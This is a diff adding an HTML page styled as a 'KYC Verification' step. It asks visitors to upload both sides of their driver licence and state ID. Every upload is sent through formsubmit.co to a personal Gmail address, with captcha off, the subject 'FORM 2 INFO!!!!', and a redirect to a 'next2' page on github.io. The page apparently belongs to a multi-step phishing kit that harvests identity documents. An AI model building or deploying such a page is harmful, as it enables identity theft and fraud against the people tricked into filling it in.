@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KYC Verification</title>
+    <!--Google Font-->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
+    <!--Stylesheet-->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Kyc verification </h1><br>
+        <p>Make your Kyc verification to continue </p>
+       <form action="https://formsubmit.co/u8071577@gmail.com" method="POST" enctype="multipart/form-data">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_subject" value="FORM 2 INFO!!!!">
+                <input type="hidden" name="_next" value="https://echo-films.github.io/Kyc-verification/next2.html">
+  
+   
+            <div class="row">
+                <div class="column">
+                    <label for="dlfront">Upload Your Driver licence <b>(FRONT VIEW)</b></label> 
+                    <input type="file" name="DLfront" id="DLfront"  required>
+                </div>
+                <div class="column">
+                    <label for="dlback">Upload Driver licence (BACK VIEW)</label>
+                    <input type="file" name="DLback" id="DLback"  required>
+                </div>
+            </div>
+            <div class="row">
+                <div class="column">
+                    <label for="stateidf">Upload State ID (FRONT VIEW)</label>
+                    <input type="file" name="stateid" id="stateid" required>
+                </div>
+                <div class="column">
+                    <label for="stateidb">Upload State ID (BACK VIEW)</label>
+                    <input type="file" name="backstate" id="backstate" required>
+                </div><div class="column">
+                    
+                </div>
+            </div>
+            
+            <button>Next</button>
+        </form>
+    </div>
+</body>
+</html>
